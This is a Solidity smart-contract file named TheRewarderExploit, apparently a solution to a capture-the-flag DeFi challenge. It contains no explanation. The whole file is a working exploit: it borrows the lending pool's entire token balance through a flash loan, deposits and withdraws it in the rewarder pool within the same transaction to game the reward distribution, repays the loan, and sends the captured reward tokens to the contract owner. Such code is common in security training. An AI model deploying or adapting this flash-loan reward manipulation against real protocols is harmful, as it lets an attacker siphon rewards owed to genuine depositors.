// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface ILendingPool {
    function flashLoan(uint256 amount) external;
}

contract TheRewarderExploit {
    address private immutable owner;

    ITheRewarderPool immutable pool;

    ILendingPool immutable lending;

    IERC20 private immutable token;

    IERC20 private immutable rewardToken;

    constructor(
        address _pool,
        address _lending,
        address _liquidityToken,
        address _rewardToken
    ) {
        owner = msg.sender;
        pool = ITheRewarderPool(_pool);
        lending = ILendingPool(_lending);
        token = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
    }

    function work() external {
        require(owner == msg.sender);
        uint256 bal = token.balanceOf(address(lending));
        lending.flashLoan(bal);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(lending));
        token.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        token.transfer(address(lending), amount);
    }

    function withdraw() external {
        require(owner == msg.sender);
        pool.distributeRewards();
        uint256 bal = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, bal);
    }
}
